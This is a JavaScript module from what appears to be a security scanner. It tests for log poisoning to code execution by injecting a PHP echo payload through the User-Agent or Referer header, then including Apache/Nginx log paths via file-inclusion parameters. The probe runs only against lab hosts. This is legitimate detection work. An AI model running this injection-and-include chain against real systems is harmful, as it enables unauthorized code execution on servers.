// Dark Matter rule-based scanner — log poisoning to RCE probe.
// Oracle (coverage row #337 [Critical], batch-6 re-proof): a canary in a
// field that lands in a server log (User-Agent, Referer as fallback),
// then include the log path through an LFI sink and confirm ONLY when
// the poisoned entry EXECUTES — a subsequent include returns the
// executed marker with the raw PHP payload gone. Bare log reflection
// is never confirmation; execution is.
//
// Two steps, both bounded:
//   1. Discovery: a benign canary (dmprobe-benign-<rand>) in the log
//      field, then one include attempt per (LFI param, log path) pair
//      until the canary appears in the included output — that pair
//      proves the log is writable AND includable. LFI params are the
//      usual include-sink names (file/page/path/include/view, max 5);
//      log paths are the six standard Apache/Nginx/httpd locations.
//      If User-Agent discovery finds nothing, discovery retries once
//      with Referer (some log formats record only one of them).
//   2. Execution: PHP code (<?php echo "dmprobe-<rand>-exec";?>)
//      through the same field, include the same log path. Confirmed
//      only when the executed marker appears AND the raw payload does
//      not — execution consumed the PHP tags. A merely reflected
//      payload still contains the raw <?php text, and an HTML-escaped
//      reflection still contains &lt;?php, so both are excluded by the
//      same check. One finding per scan: the first working pair wins.
//
// Lab-gated: writing attacker content into server logs is a write, so
// the probe returns [] without a single request on a non-lab host
// (isLabTargetHost, labCreds.js — same gate as rfi/xslt).
import { isLabTargetHost } from '../../labCreds.js';
import { mutateUrl, probePointName, probePointParameter, noteAttemptedPoints } from '../probePoints.js';

const UA = 'DarkMatter-Scanner/1.0 (+authorized-scan)';

async function get(url, opts = {}, headers = {}) {
  const ctrl = new AbortController();
  const t = setTimeout(() => ctrl.abort(), opts.timeoutMs || 15000);
  try {
    const res = await fetch(url, { signal: ctrl.signal, headers: { ...headers } });
    return await res.text().catch(() => '');
  } finally {
    clearTimeout(t);
  }
}

const LFI_PARAM_NAMES = new Set(['file', 'page', 'path', 'include', 'view']);

const LOG_PATHS = [
  '/var/log/apache2/access.log',
  '/var/log/apache2/error.log',
  '/var/log/nginx/access.log',
  '/var/log/nginx/error.log',
  '/var/log/httpd/access_log',
  '/var/log/httpd/error_log',
];

const LOG_FIELDS = ['user-agent', 'referer'];

function rand() {
  return Math.random().toString(36).slice(2, 10);
}

function fieldHeaders(field, value) {
  return field === 'user-agent' ? { 'User-Agent': value } : { Referer: value };
}

// Discovery for one log field: poison the log with the benign canary,
// then include each candidate log path through each LFI param until
// the canary appears in the included output. Returns the working
// { param, logPath } pair, or null when no pair proves writability +
// inclusion.
async function discoverPair(url, params, opts, field, canary) {
  try {
    await get(url, opts, fieldHeaders(field, canary));
  } catch {
    return null;
  }
  for (const param of params) {
    for (const logPath of LOG_PATHS) {
      let body;
      try {
        body = await get(mutateUrl(url, param, logPath), opts, { 'User-Agent': UA });
      } catch {
        continue;
      }
      if (body.includes(canary)) return { param, logPath };
    }
  }
  return null;
}

export async function probeLogPoisoning(url, params, opts = {}) {
  const findings = [];
  const targets = (params || [])
    .filter((p) => LFI_PARAM_NAMES.has(probePointName(p).toLowerCase()))
    .slice(0, 5);
  noteAttemptedPoints(opts, targets);
  if (!targets.length) return findings;
  if (!isLabTargetHost(url, opts.labTargets)) return findings;

  const rid = rand();
  const benignCanary = `dmprobe-benign-${rid}`;
  const execMarker = `dmprobe-${rid}-exec`;
  const phpPayload = `<?php echo "${execMarker}";?>`;

  for (const field of LOG_FIELDS) {
    const pair = await discoverPair(url, targets, opts, field, benignCanary);
    if (!pair) continue;
    // Execution test through the same field that discovery proved
    // lands in the log. The poison request itself is best-effort: a
    // failed send means the log was never poisoned, so try the next
    // field rather than reading a stale log.
    try {
      await get(url, opts, fieldHeaders(field, phpPayload));
    } catch {
      continue;
    }
    let body;
    try {
      body = await get(mutateUrl(url, pair.param, pair.logPath), opts, { 'User-Agent': UA });
    } catch {
      continue;
    }
    // Execution, not reflection: the marker is present AND the raw
    // payload is gone. A reflected payload still carries the raw
    // <?php text (or &lt;?php when HTML-escaped) — either one voids
    // the oracle, because the marker string sits inside the payload
    // text itself and would match on reflection alone.
    const executed =
      body.includes(execMarker) &&
      !body.includes(phpPayload) &&
      !body.includes('<?php') &&
      !body.includes('&lt;?php');
    if (!executed) continue;
    const idx = body.indexOf(execMarker);
    const window = body.slice(Math.max(0, idx - 60), idx + 120);
    findings.push({
      class: 'log_poisoning',
      id: `log-poisoning-${probePointName(pair.param)}`,
      title: `Log poisoning to remote code execution via parameter '${probePointParameter(pair.param)}' (log file included and executed)`,
      severity: 'critical',
      url,
      param: probePointParameter(pair.param),
      evidence: {
        request: `GET ${mutateUrl(url, pair.param, pair.logPath)}`,
        response: `executed marker present, raw PHP payload absent — "...${window}..."`,
        impact_demo: `PHP code injected via ${field} executed when ${pair.logPath} was included through '${probePointParameter(pair.param)}'`,
        signalCorrelated: true,
        diverged: true,
        executed: true,
        logPath: pair.logPath,
        field,
      },
    });
    return findings;
  }
  return findings;
}
